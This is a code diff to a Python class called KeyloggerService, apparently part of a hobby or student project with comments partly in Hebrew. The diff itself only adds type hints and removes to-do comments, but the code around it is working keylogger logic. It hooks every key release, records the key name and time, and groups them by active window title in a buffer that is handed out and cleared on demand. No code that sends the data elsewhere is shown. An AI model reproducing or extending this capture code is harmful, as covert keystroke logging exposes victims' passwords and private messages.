@@ -8,6 +8,7 @@ class KeyloggerService:
     This class receives all user keystrokes with data on the keystrokes.
     The data is the click time and the window in which it was pressed
     """
+
     # Initializing the class with a data field, and starting listening
     def __init__(self):
         self.__data = {}
@@ -15,37 +16,32 @@ class KeyloggerService:
 
     # מחזירה את הנתונים משדה __data ומאפסת את שדה זה
     @property
-    def data(self):
+    def data(self) -> dict:
         temp_data = self.__data
         self.__data = {}
         return temp_data
 
-    def start(self):
+    def start(self) -> None:
         keyboard.on_release(self.handle_input)
 
     @staticmethod
-    def get_keyword(key: keyboard.KeyboardEvent):
+    def get_keyword(key: keyboard.KeyboardEvent) -> str:
         key_name = key.name
-        # להבדיל בין תווים למקשים מיוחדים
-        # למצוא דרך לזהות לחיצה על כמה מקשים בו זמנית
-        # לתקן הצפנה של תווים מיוחדים
         if len(key_name) > 1:
             key_name = '~' + key_name + '~'
-        #
-
         return key_name
 
     @staticmethod
-    def get_time(key: keyboard.KeyboardEvent):
+    def get_time(key: keyboard.KeyboardEvent) ->str:
         key_time = key.time
         key_time = datetime.fromtimestamp(key_time).strftime('%Y-%m-%d %H:%M')
         return key_time
 
     @staticmethod
-    def get_active_window():
+    def get_active_window() ->str:
         return pw.getActiveWindowTitle()
 
-    def handle_input(self,key):
+    def handle_input(self,key) ->None:
         active_window = self.get_active_window()
         if active_window not in self.__data:
             self.__data[active_window] = {}
